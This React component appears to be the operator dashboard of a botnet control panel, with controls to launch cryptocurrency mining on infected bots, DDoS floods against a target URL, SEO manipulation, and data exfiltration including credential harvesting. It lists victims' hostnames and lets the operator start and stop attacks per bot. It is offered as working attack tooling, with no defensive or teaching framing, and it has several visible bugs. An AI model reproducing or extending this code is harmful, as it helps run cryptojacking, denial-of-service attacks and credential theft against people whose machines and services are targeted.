import React, {useState, useEffect} from 'react'
import { motion, AnimatePresence} from 'framer-motion'
import {
    Shield,
    Key,
    Camera,
    Eye, 
    Lock,
    Unlock,
    Play,
    StopCircle,
    Cpu,
    Network,
    TrendingUp,
    RefreshCw,
    AlertTriangle,
    CheckCircle,
    XCircle
} from 'lucide-react'
import { apiUtils, ddosApi, miningApi} from '../../utils/api'

const SpecialOperations = () => {
    const [activeOperations, setActiveOperations] = useState({
        mining: [],
        ddos: []
    });
    const [isLoading, setIsLoading] = useState(true);
    const [selectedOperation, setSelectedOperation] = useState(null);
    const operations = [
        {
            id: 1,
            name: 'Cryptocurrency Mining',
            type: 'Mining',
            icon: Cpu,
            description: 'Utilize bot resources for cryptocurrency mining operations',
            risk: 'medium',
            capabilities: ['cpu_mining', 'gpu_mining'],
            parameters: {
                algorithm: 'cryptonight',
                intensity: 50
            }
        },
        {
            id: 2,
            name: 'DDoS Attack',
            type: 'ddos',
            icon: Network,
            description: 'Launch distributed denial of service attacks',
            risk: 'high',
            capabilities: ['http_flood', 'tcp_flood', 'udp_flood'],
            parameters: {
                target_url: '',
                duration: 60,
                threads: 10
            }
        },
        {
            id: 3,
            name: 'SEO Manipulation',
            type: 'seo',
            icon: TrendingUp,
            description: 'Manipulate search engine rankings and traffic',
            risk: 'low',
            capabilities: ['traffic_generation', 'backlink_creations'],
            parameters: {
                keyword: '',
                duration_hours: 24,
            }
        },
        {
            id: 4,
            name: 'Data Exfiltration',
            type: 'data',
            icon: Eye,
            description: 'Systematic collection and exfiltration of sensitive data',
            risk: 'high',
            capabilities: ['file_collection', 'credential_harvesting'],
            parameters: {
                data_types: ['credentials', 'files']
            }
        }
    ];

    const fetchActiveOperations = async () => {
        try {
            setIsLoading(true);
            const [miningResponse , ddosResponse] = await Promise.all([
                miningApi.getOperations(),
                ddosApi.getAttacks()
            ]);

            setActiveOperations({
                mining: miningResponse.data.results || miningResponse.data || [],
                ddos: ddosResponse.data.results || ddosResponse.data || []
            });
        } catch (error) {
            console.error('Failed to fetch operations: ', error);
        } finally {
            setIsLoading(false);
        }
    };

    useEffect(() => {
        fetchActiveOperations();
        const interval  = () => setInterval(fetchActiveOperations, 10000); //Every 10 seconds
        return () => clearInterval(interval)
    }, []);

    const startOperation = async (operationType, operationData) => {
        try {
            let response 
            if (operationType === 'mining') {
                response = await miningApi.start(operationData);
            } else if (operationType === 'ddos') {
                response = await ddosApi.start(operationData);
            }

            if (response) {
                fetchActiveOperations(); //Refresh operations list
            } 
        } catch (error) {
            console.error(`Failed to start ${operationType} operation: `, error);
        }
    };

    const stopOperation = async (operationType, botId) => {
        try { 
            let response 
            if (operationType === 'mining') {
                response = miningApi.stop(botId);
            } else if (operationType === 'ddos'){
                response = await ddosApi.stop(botId);
            }
            
            if (response) {
                fetchActiveOperations();
            }
        } catch (error) {
            console.error(`Failed to stop ${operationType} operations: `, error);
        }
    };

    const OperationCard = ({ operation }) => {
        const Icon  = operation.icon;
        const activeOps = activeOperations[operation.type] || [];
        const isActive = activeOps.length > 0;

        return (
            <motion.div
                whileHover={{ y: 5}}
                className={`p-6 rounded-xl border-2 transition-all ${
                    isActive
                        ? 'border-cyan-500 bg-cyan-500/10'
                        : 'border-gray-700 bg-gray-800'
                }`}
            >
                <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center space-x-3">
                        <div className={`p-3 rounded-full ${
                            isActive ? 'bg-cyan-500/20' : 'bg-gray-700'
                        }`}>
                            <Icon size={24} className={isActive ? 'text-cyan-500' : 'text-gray-400'}></Icon>
                        </div>
                        <div>
                            <h3 className="font-semibold text-lg">{operation.name}</h3>
                            <span className={`text-sm px-2 py-1 rounded ${
                                operation.risk === 'high'
                                    ? 'bg-red-500/20 text-red-500'
                                    : operation.risk === 'medium'
                                    ? 'bg-yellow-500/20 text-yellow-500'
                                    : 'bg-green-500/20 text-green-500'
                            }`}>
                                {operation.risk} risk
                            </span>
                        </div>
                    </div>
                    <div className="flex items-center space-x-2">
                        <span className={`text-sm ${
                            isActive ? 'text-green-500' : 'text-gray-400'
                        }`}>
                            {activeOps.length} active
                        </span>
                    </div>
                </div>

                <p className="text-gray-400 mb-4">{operation.description}</p>

                {/* Capabilities */}
                <div className="mb-4">
                    <h4 className="text-sm font-medium text-gray-400 mb-2">Capabilities</h4>
                    <div className="flex flex-wrap gap-2">
                        {operation.capabilities.map((capability, index) => (
                            <span key={index} className="px-2 py-1 bg-gray-700 rounded text-xs">
                                {capability.replace('_', ' ')}
                            </span>
                        ))}
                    </div>
                </div>

                {/* Active operations */}
                {isActive && (
                    <div className="mb-4">
                        <h4 className="text-sm font-medium text-gray-400 mb-2">Active Operations</h4>
                        <div className="space-y-2">
                            {activeOps.slice(0, 3).map((op, index) => (
                                <div key={index} className="flex items-center justify-between text-sm">
                                    <span>{op.bot_info?.hostname}</span>
                                    <span className="text-green-500">Running</span>
                                </div>
                            ))}
                            {activeOps.length > 3 && (
                                <div className="text-xs text-gray-400">
                                    +{activeOps.length - 3} more operations
                                </div>
                            )}
                        </div>
                    </div>
                )}

                <motion.button
                    whileHover={{ scale: 1.05}}
                    whileTap={{ scale: 0.95}}
                    onClick={() => setSelectedOperation(operation)}
                    className={`w-full py-3 rounded-lg font-semibold flex items-ceter justify-center space-x-2 ${
                        isActive
                            ? 'bg-red-600 hover:bg-red-700'
                            : 'bg-cyan-600 hover:bg-cyan-700'
                    }`}
                >
                    {isActive ? <StopCircle size={20}></StopCircle> : <Play size={20}></Play>}
                    <span>{isActive ? 'Stop Operations' : 'Start Operation'}</span>
                </motion.button>
            </motion.div>
        )

    };

    const OperationModal = ({ operation, onClose}) => {
        const [formData , setFormData] = useState(operation.parameters);
        const [selectedBots, setSelectedBots] = useState([]);

        const handleSubmit = (e) => {
            e.preventDefault();
            startOperation(operation.type, {
                ...formData,
                bot_ids: selectedBots
            });
            onClose();
        };

        return (
            <motion.div
                initial={{ opacity: 0, y: 20}}
                animate={{ opacity: 1, y: 0}}
                exit={{ opacity: 0, y: 20}}
                className='fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50'
                onClick={onClose}
            >
                <motion.div
                    initial={{ scale: 0.9}}
                    animate={{ scale: 1}}
                    className='bg-gray-800 rounded-xl p-6 w-ful max-w-2xl border border-gray-700'
                    onClick={e => e.stopPropagation()}
                >
                    <div className="flex justify-between items-center mb-6">
                        <h2 className="text-2xl font-bold">Start {operation.name}</h2>
                        <button
                            onClick={onClose}
                            className='p-2 hover:bg-gray-700 rounded-lg'
                        >
                            X
                        </button>
                    </div>

                    <form
                        onSubmit={handleSubmit}
                        className='space-y-4'
                    >
                        {/* Operation specific parameters */}
                        {operation.type === 'mining' && (
                            <>
                                <div>
                                    <label className='block text-sm font-medium text-gray-400 mb-2'>
                                        Algorithm
                                    </label>
                                    <select
                                        value={formData.algorithm}
                                        onChange={(e) => setFormData({...formData, algorithm: e.target.value})}
                                        className='w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-cyan-700'
                                    >
                                        <option value='cryptonight'>CryptoNight</option>
                                        <option value='sha256'>SHA-256</option>
                                        <option value='scrypt'>Scrypt</option>
                                        <option value='ethash'>Ethash</option>
                                    </select>
                                </div>
                                <div>
                                    <label className='block text-sm font-medium text-gray-400 mb-2'>
                                        Intensity ({formData.intensity})
                                    </label>
                                    <input
                                        type='range'
                                        min='1'
                                        max='100'
                                        value={formData.intensity}
                                        onChange={(e) => setFormData({...formData, intensity: parseInt(e.target.value)})}
                                        className='w-full'
                                    ></input>
                                </div>
                            </>
                        )}

                        {operation.type === 'ddos' && (
                            <>
                                <div>
                                    <label className='block text-sm font-medium text-gray-400 mb-2'>
                                        Target URL
                                    </label>
                                    <input
                                        type='url'
                                        value={formData.target_url}
                                        onChange={(e) => setFormData({...formData, target_url: e.target.value})}
                                        placeholder='https://target.com'
                                        className='w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500'
                                        required
                                    ></input>
                                </div>
                                <div className="grid grid-cols-2 gap-4">
                                    <div>
                                        <label className='block text-sm font-medium text-gray-400 mb-2'>
                                            Duration (seconds)
                                        </label>
                                        <input
                                            type='number'
                                            value={formData.duration}
                                            onChange={(e) => setFormData({...formData,duration: parseInt(e.target.value)})}
                                            className='w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500'
                                            min='1'
                                            max='3600'
                                        ></input>
                                    </div>
                                    <div>
                                        <label>
                                            Threads
                                        </label>
                                        <input
                                            type='number'
                                            value={formData.threads}
                                            onChange={(e) => setFormData({...formData, threads: parseInt(e.target.value)})}
                                            className='w-full p-3 bg-gray-700 border border-gray-600 rounded-lg focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500'
                                            min='1'
                                            max='500'
                                        ></input>
                                    </div>
                                </div>
                            </>
                        )}

                        <div className="flex space-x-4 pt-4">
                            <motion.button
                                type='button'
                                whileHover={{ scale: 1.05}}
                                whileTap={{ scale: 0.95}}
                                onClick={onClose}
                                className='flex-1 py-3 bggray-700 rounded-lg font-semibold'
                            >
                                Cancel
                            </motion.button>
                            <motion.button
                                type='submit'
                                whileHover={{ scale: 1.05}}
                                whileTap={{ scale: 0.95}}
                                className='flex-1 py03 bg-cyan-600 rounded-lg font-semibold'
                            >
                                Start Operation
                            </motion.button>
                        </div>
                    </form>
                </motion.div>
            </motion.div>
        );
    };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 py-12">
        <div className="max-w-6xl mx-auto p-6 space-y-6">
            <motion.div
                initial={{ opacity: 0, y: -20}}
                animate={{ opacity: 1, y: 0}}
                className='flex justify-between items-center'
            >
                <div>
                    <h1 className="text-3xl font-bold">Special Operations</h1>
                    <p className="text-gray-400">
                        Advanced operations and attack vectors
                    </p>
                </div>
                <div className="flex items-center space-x-4">
                    <div className="text-sm text-gray-400">
                        Total Active: {activeOperations.mining.length + activeOperations.ddos.length}
                    </div>
                    <motion.button
                        whileHover={{ scale: 1.05}}
                        whileTap={{ scale: 0.95}}
                        onClick={fetchActiveOperations}
                        className='px-4 py-2 bg-gray-700 rounded-lg font-semibold flex items-center space-x-2'
                    >
                        <RefreshCw size={20}></RefreshCw>
                        <span>Refresh</span>
                    </motion.button>
                </div>
            </motion.div>

            {/* Operations Grid */}
            <div className="grid grid-cols-1 md:grid-cols-1 gap-6">
                {operations.map((operation) => (
                    <OperationCard key={operation.id} operation={operation}></OperationCard>
                ))}
            </div>

            {/* Active Operations Details */}
            <motion.div
                initial={{ opacity: 0, y: 20}}
                animate={{ opacity: 1 ,y:0}}
                className='grid grid-cols-1 lg:grid-cols-2 gap-6'
            >
                {/* Mining operations */}
                <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
                    <h3 className="text-lg font-semibold mb-4 flex items-center space-x-2">
                        <Cpu size={20} className='text-cyan-500'></Cpu>
                        <span>Active Mininng Operations</span>
                        <span className="bg-cyan-500/20 text-cyan-500 text-sm px-2 py-1 rounded">
                            {activeOperations.mining.length}
                        </span>
                    </h3>
                    <div className="space-y-3">
                        {activeOperations.mining.map((op, index) => (
                            <div key={index} className="flex items-center justify-between p-3 bg-gray-700 rounded-lg">
                                <div>
                                    <div className="font-medium">{op.bot_info?.hostname}</div>
                                    <div className="text-sm text-gray-400">
                                        {op.algorithm} • {op.intensity}% intensity
                                    </div>
                                </div>
                                <div className="flex items-center space-x-2">
                                    <span className="text-green-500 text-sm">
                                        {op.hashes_per_second > 0 ? `${op.hashes_per_second.toFixed(2)} H/s` : 'Starting...'}
                                    </span>
                                    <motion.button
                                        whileHover={{ scale: 1.1}}
                                        whileTap={{ scale: 0.9}}
                                        onClick={() => stopOperation('mining', op.bot_info?.bot_id)}
                                        className='p-2 bg-red-600 rounded-lg'
                                    >
                                        <StopCircle size={16}></StopCircle>
                                    </motion.button>
                                </div>
                            </div>
                        ))}
                        {activeOperations.mining.length === 0 && (
                            <div className="text-center text-gray-400 py-4">
                                <Cpu size={32} className='mx-auto mb-2 opacity-50'></Cpu>
                                <p>No active mining operations</p>
                            </div>
                        )}
                    </div>
                </div>
                {/* DDoS Attacks */}
                <div className="bg-gray-800 rounded-xl p-6 border border-gray-700">
                    <h3 className="text-lg font-semibold mb-4 flex items-center space-x-2">
                        <Network size={20} className='text-red-500'></Network>
                        <span>Active DDoS Attacks</span>
                        <span className="bg-red-500/20 text-red-500 text-sm px-2 py-1 rounded">
                            {activeOperations.ddos.length}
                        </span>
                    </h3>
                    <div className="space-y-3">
                        {activeOperations.ddos.map((attack, index) => (
                            <div key={index} className="flex items-center justify-between p-3 bg-gray-700 rounded-lg">
                                <div>
                                    <div className="font-medium">{attack.bot_info?.hostname}</div>
                                    <div className="text-sm text-gray-400">
                                        {attack.target_domain} • {attack.requests_sent} requests
                                    </div>
                                </div>
                                <div className="flex items-center space-x-2">
                                    <span className="text-red-500 text-sm">
                                        {attack.duration_remaining}s remaining
                                    </span>
                                    <motion.button
                                        whileHover={{ scale: 1.1}}
                                        whileTap={{ scale: 0.9}}
                                        onClick={() => stopOperation('ddos', attack.bot_info?.bot_id)}
                                        className='p-2 bg-red-600 rounded-lg'
                                    >
                                        <StopCircle size={16}></StopCircle>
                                    </motion.button>
                                </div>
                            </div>
                        ))}
                        {activeOperations.ddos.length === 0 && (
                            <div className="text-center text-gray-400 py-4">
                                <Network size={32}></Network>
                                <p>No active DDoS attacks</p>
                            </div>
                        )}
                    </div>
                </div>
            </motion.div>

            {/* Operation Modal */}
            <AnimatePresence>
                {selectedOperation && (
                    <OperationModal
                        operation={selectedOperation}
                        onClose={() => setSelectedOperation(null)}
                    ></OperationModal>
                )}
            </AnimatePresence>
        </div>
    </div>
  );
};

export default SpecialOperations;